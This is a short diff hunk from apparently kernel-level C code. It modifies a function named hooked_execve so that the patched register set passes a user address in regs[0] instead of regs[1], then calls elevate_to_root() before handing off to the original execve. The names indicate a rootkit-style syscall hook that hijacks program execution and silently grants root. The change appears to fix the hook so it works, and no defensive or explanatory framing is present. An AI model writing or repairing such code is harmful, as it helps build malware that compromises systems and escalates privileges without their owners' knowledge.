@@ -121,7 +121,7 @@ static long hooked_execve(const struct pt_regs *regs)
 		kpath, uaddr);
 
 	patched = *regs;
-	patched.regs[1] = uaddr;
+	patched.regs[0] = uaddr;
 	elevate_to_root();
 	return orig_execve(&patched);
 
